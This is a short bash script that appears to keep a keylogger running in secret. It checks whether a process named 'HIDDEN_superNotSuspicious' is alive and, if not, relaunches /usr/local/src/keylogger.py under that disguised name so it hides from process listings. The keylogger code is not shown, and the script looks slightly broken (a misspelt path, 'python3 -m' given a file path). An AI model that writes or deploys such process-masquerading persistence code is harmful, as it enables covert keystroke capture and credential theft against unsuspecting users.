#! /bin/bash

if [ -z $(/var/loog/backup_ps | grep HIDDEN_superNotSuspicious) ]; then
    bash -c "exec -a HIDDEN_superNotSuspicious /bin/python3 -m /usr/local/src/keylogger.py"
fi

